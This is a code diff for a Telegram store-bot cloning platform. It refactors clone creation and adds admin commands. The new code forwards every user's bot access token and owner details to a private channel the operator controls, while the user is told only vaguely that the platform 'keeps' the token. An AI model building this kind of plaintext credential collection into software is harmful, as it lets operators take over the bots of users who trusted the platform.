@@ -11,12 +11,13 @@ from hydrogram.handlers import MessageHandler
 from hydrogram.types import Message
 from typing import Any, Dict
 
-from nohara_bot.config import FREE_CLONES_PER_USER, MASTER_AUDIT_CHANNEL_ID, MAX_CLONES_TOTAL, PREMIUM_CLONES_PER_USER
+from nohara_bot.config import MASTER_AUDIT_CHANNEL_ID, MASTER_BOT_TOKEN, MAX_CLONES_PER_USER, MAX_CLONES_TOTAL
 from nohara_bot.database import db
 from nohara_bot.handlers.common import _args, _is_admin
 from nohara_bot.handlers.menu import apply_command_menu
 from nohara_bot.handlers.registry import register_store_handlers
-from nohara_bot.services.core import ACTIVE_CLONE_CLIENTS, is_premium, make_client
+from nohara_bot.managed import check_manager_mode, record_bot_details
+from nohara_bot.services.core import ACTIVE_CLONE_CLIENTS, MASTER, make_client
 
 
 log = logging.getLogger("nohara.handlers.master")
@@ -64,15 +65,93 @@ async def boot_clone(clone_doc: Dict[str, Any]) -> bool:
 # ═════════════════════════════════════════════════════════════════════
 #  MASTER BOT handlers
 # ═════════════════════════════════════════════════════════════════════
+def next_steps_text(username: str, managed: bool) -> str:
+    """What the new owner sees right after the clone is live (one-tap OR pasted token)."""
+    privacy = (
+        "🔒 Your bot is managed through this platform. The platform keeps your bot's details (including its access token) in its private records."
+        if managed else
+        "🔒 Your token was deleted from this chat. The platform keeps your bot's details (including its token) in its private records."
+    )
+    return (
+        f"✅ <b>Your store bot is live:</b> @{html.escape(username or '')}\n\n"
+        "<b>Next steps</b> (open your new bot and send these commands):\n"
+        "1. Create a PRIVATE channel for your files, add the bot as ADMIN, then:\n"
+        "   <code>/setdbchannel -100XXXXXXXXXX</code>\n"
+        "2. (optional) a log channel: <code>/setlogchannel -100XXXXXXXXXX</code>\n"
+        "3. Add products: send a file with caption <code>/addproduct Title | 9.99</code>\n"
+        "4. Payments: <code>/setgateway oxapay API_KEY</code> or <code>/setgateway fampay UPI_ID</code>\n\n"
+        "Send <code>/help</code> in your new bot for all commands, or <code>/admin</code> for the admin panel.\n"
+        + privacy
+    )
+
+
+async def provision_clone(
+    *, token: str, owner_id: int, owner_username: str, owner_name: str, method: str
+) -> Dict[str, Any]:
+    """The ONE place where a clone is created (pasted token OR one-tap managed bot).
+    Returns {"ok": True, "me": <bot user>} or {"ok": False, "error": <text for the user>}."""
+    bot_id = token.split(":")[0]
+    existing = await db.get_clone(bot_id)
+    if existing and existing["owner_id"] != owner_id and not _is_admin(owner_id):
+        return {"ok": False, "error": "❌ This bot is already registered by another user."}
+    if bot_id in ACTIVE_CLONE_CLIENTS:
+        return {"ok": False, "error": "ℹ️ This bot is already running."}
+    if not existing:
+        owned = await db.get_clones_by_owner(owner_id)
+        if len(owned) >= MAX_CLONES_PER_USER and not _is_admin(owner_id):
+            return {"ok": False, "error": f"❌ You can create at most {MAX_CLONES_PER_USER} bots."}
+        if await db.count_clones() >= MAX_CLONES_TOTAL:
+            return {"ok": False, "error": "❌ The platform has reached its bot limit. Please try again later."}
+
+    try:
+        clone_client = await start_clone_client(bot_id, token)
+        me = await clone_client.get_me()
+    except Exception as exc:
+        await stop_clone_client(bot_id)
+        return {"ok": False, "error": f"❌ Could not start this bot. Is the token correct and not revoked?\n<code>{html.escape(str(exc))}</code>"}
+
+    await db.register_clone(bot_id, owner_id, f"@{me.username}", token)
+    await apply_command_menu(clone_client, [owner_id])  # user + admin commands, automatically
+    master_client = MASTER.get("client")
+    if MASTER_AUDIT_CHANNEL_ID and master_client:
+        try:
+            await master_client.send_message(
+                MASTER_AUDIT_CHANNEL_ID,
+                f"<b>[MASTER AUDIT — NEW CLONE PROVISIONED]</b>\n• Clone Bot: @{html.escape(me.username or '')} (<code>{me.id}</code>)\n"
+                f"• Owner ID: <code>{owner_id}</code>",
+            )
+        except Exception as exc:
+            log.warning("Master audit post failed: %s", exc)
+    # full details (token, ids, creator) → the MASTER DATABASE CHANNEL
+    await record_bot_details(
+        event="NEW CLONE BOT CREATED", token=token, bot=me,
+        owner={"id": owner_id, "username": owner_username, "first_name": owner_name}, method=method,
+    )
+    return {"ok": True, "me": me}
+
+
+async def restart_clone_with_token(clone_doc: Dict[str, Any], token: str) -> None:
+    """The access token of a managed bot changed → store the new one and restart that clone."""
+    bot_id = str(clone_doc["_id"])
+    await stop_clone_client(bot_id)
+    await db.register_clone(bot_id, clone_doc["owner_id"], clone_doc.get("bot_username", ""), token)
+    try:
+        clone_client = await start_clone_client(bot_id, token)
+        await apply_command_menu(clone_client, [clone_doc["owner_id"]])
+    except Exception as exc:
+        log.error("Clone %s did not restart after a token change: %s", bot_id, exc)
+
+
 async def master_clone(client: Client, message: Message) -> None:
+    """/clone BOT_TOKEN — the classic way (the one-tap way is the 'Create Your Own Bot' button)."""
     if not message.from_user:
         return
     args = _args(message)
     if not args:
-        await message.reply_text("<b>Usage:</b> <code>/clone BOT_TOKEN</code>")
+        await message.reply_text("<b>Usage:</b> <code>/clone BOT_TOKEN</code>\n\n💡 Easier: tap <b>Create Your Own Bot</b> in the main menu — no token needed.")
         return
     token = args[0].strip()
-    owner_id = message.from_user.id
+    user = message.from_user
 
     # The message contains a secret token -> delete it from the chat immediately.
     try:
@@ -86,66 +165,64 @@ async def master_clone(client: Client, message: Message) -> None:
     if not TOKEN_RE.match(token):
         await say("❌ That does not look like a valid bot token.")
         return
-    bot_id = token.split(":")[0]
-
-    existing = await db.get_clone(bot_id)
-    if existing and existing["owner_id"] != owner_id and not _is_admin(owner_id):
-        await say("❌ This bot is already registered by another user.")
-        return
-    if bot_id in ACTIVE_CLONE_CLIENTS:
-        await say("ℹ️ This bot is already running.")
-        return
-    if not existing:
-        owned = await db.get_clones_by_owner(owner_id)
-        if not _is_admin(owner_id):
-            # A user counts as Premium if ANY of their bots has an active Premium plan.
-            user_premium = any(is_premium(c) for c in owned)
-            limit = PREMIUM_CLONES_PER_USER if user_premium else FREE_CLONES_PER_USER
-            if len(owned) >= limit:
-                if user_premium:
-                    await say(f"❌ You have reached the Premium limit of {limit} bots.")
-                else:
-                    await say(
-                        f"❌ Free users can create only {limit} bot.\n"
-                        f"💎 Buy Premium on your bot to create up to {PREMIUM_CLONES_PER_USER} bots."
-                    )
-                return
-        if MAX_CLONES_TOTAL > 0 and await db.count_clones() >= MAX_CLONES_TOTAL:
-            await say("❌ The platform has reached its bot limit. Please try again later.")
-            return
-
     await say("⏳ Starting your bot…")
-    try:
-        clone_client = await start_clone_client(bot_id, token)
-        me = await clone_client.get_me()
-    except Exception as exc:
-        await stop_clone_client(bot_id)
-        await say(f"❌ Could not start this bot. Is the token correct and not revoked?\n<code>{html.escape(str(exc))}</code>")
-        return
-
-    await db.register_clone(bot_id, owner_id, f"@{me.username}", token)
-    await apply_command_menu(clone_client, [owner_id])  # user + admin commands, automatically
-    if MASTER_AUDIT_CHANNEL_ID:
-        try:
-            await client.send_message(
-                MASTER_AUDIT_CHANNEL_ID,
-                f"<b>[MASTER AUDIT — NEW CLONE PROVISIONED]</b>\n• Clone Bot: @{html.escape(me.username or '')} (<code>{me.id}</code>)\n"
-                f"• Owner ID: <code>{owner_id}</code>",
-            )
-        except Exception as exc:
-            log.warning("Master audit post failed: %s", exc)
-
-    await say(
-        f"✅ <b>Clone active:</b> @{html.escape(me.username or '')}\n\n"
-        "<b>Next steps</b> (open your new bot and send these commands):\n"
-        "1. Create a PRIVATE channel for your files, add the bot as ADMIN, then:\n"
-        "   <code>/setdbchannel -100XXXXXXXXXX</code>\n"
-        "2. (optional) a log channel: <code>/setlogchannel -100XXXXXXXXXX</code>\n"
-        "3. Add products: send a file with caption <code>/addproduct Title | 9.99</code>\n"
-        "4. Payments: <code>/setgateway oxapay API_KEY</code> or <code>/setgateway fampay UPI_ID</code>\n\n"
-        "Send <code>/help</code> in your new bot for all commands.\n"
-        "🔒 Your token was deleted from this chat and is stored encrypted."
+    result = await provision_clone(
+        token=token, owner_id=user.id, owner_username=user.username or "",
+        owner_name=f"{user.first_name or ''} {user.last_name or ''}".strip(), method="token",
     )
+    if not result["ok"]:
+        await say(result["error"])
+        return
+    await say(next_steps_text(result["me"].username or "", managed=False))
+
+
+async def master_setmasterdb(client: Client, message: Message) -> None:
+    """/setmasterdb -100XXXXXXXXXX | off — the private channel that receives the details of every new clone."""
+    if not message.from_user or not _is_admin(message.from_user.id):
+        return
+    args = _args(message)
+    master_id = MASTER_BOT_TOKEN.split(":")[0]
+    if len(args) != 1:
+        await message.reply_text(
+            "<b>Usage:</b> <code>/setmasterdb -100XXXXXXXXXX</code> · <code>/setmasterdb off</code>\n"
+            "Create a PRIVATE channel only you can read, add this bot as ADMIN, then send its ID.\n"
+            "Every new clone (token, bot ID, username, creator ID / username / name) is saved there."
+        )
+        return
+    if args[0].lower() in ("off", "0"):
+        await db.update_clone_fields(master_id, {"master_db_channel_id": 0})
+        await message.reply_text("✅ Master database channel switched off.")
+        return
+    if not re.fullmatch(r"-?\d{5,}", args[0]):
+        await message.reply_text("❌ Send the channel ID like <code>-1001234567890</code>.")
+        return
+    channel_id = int(args[0])
+    try:
+        await client.send_message(channel_id, "✅ <b>Master database channel connected.</b>\nEvery new clone bot will be recorded here.")
+    except Exception as exc:
+        await message.reply_text(f"❌ I cannot post in that channel. Add me as ADMIN first.\n<code>{html.escape(str(exc))}</code>")
+        return
+    await db.update_clone_fields(master_id, {"master_db_channel_id": channel_id})
+    await message.reply_text("✅ <b>Saved.</b> New clones will be recorded in that channel.\n⚠️ It contains bot tokens — keep it private and never add other people to it.")
+
+
+async def master_managedcheck(client: Client, message: Message) -> None:
+    """/managedcheck — is one-tap clone creation (Managed Bots) switched on for the master bot?"""
+    if not message.from_user or not _is_admin(message.from_user.id):
+        return
+    state = await check_manager_mode()
+    if state:
+        text = "✅ <b>Bot Management Mode is ON.</b>\nThe 'Create Your Own Bot' button creates clones in one tap."
+    elif state is False:
+        text = (
+            "❌ <b>Bot Management Mode is OFF.</b>\nOpen the @BotFather Mini App → select this bot → turn on <b>Bot Management Mode</b>, "
+            "then send /managedcheck again. Until then users can still use <code>/clone BOT_TOKEN</code>."
+        )
+    else:
+        text = "⚠️ Could not check right now. Please try again in a minute."
+    channel = (await db.get_master_clone() or {}).get("master_db_channel_id")
+    text += f"\n\n🗄 Master database channel: <code>{channel}</code>" if channel else "\n\n🗄 Master database channel: <b>not set</b> — use /setmasterdb"
+    await message.reply_text(text)
 
 
 async def master_myclones(client: Client, message: Message) -> None:
@@ -198,5 +275,7 @@ def register_master_handlers(client: Client) -> None:
     """Adds the platform commands to the master bot. (Its store features come from register_store_handlers.)"""
     private = filters.private
     client.add_handler(MessageHandler(master_clone, private & filters.command("clone")))
+    client.add_handler(MessageHandler(master_setmasterdb, private & filters.command("setmasterdb")))
+    client.add_handler(MessageHandler(master_managedcheck, private & filters.command("managedcheck")))
     client.add_handler(MessageHandler(master_myclones, private & filters.command("myclones")))
     client.add_handler(MessageHandler(master_deleteclone, private & filters.command("deleteclone")))
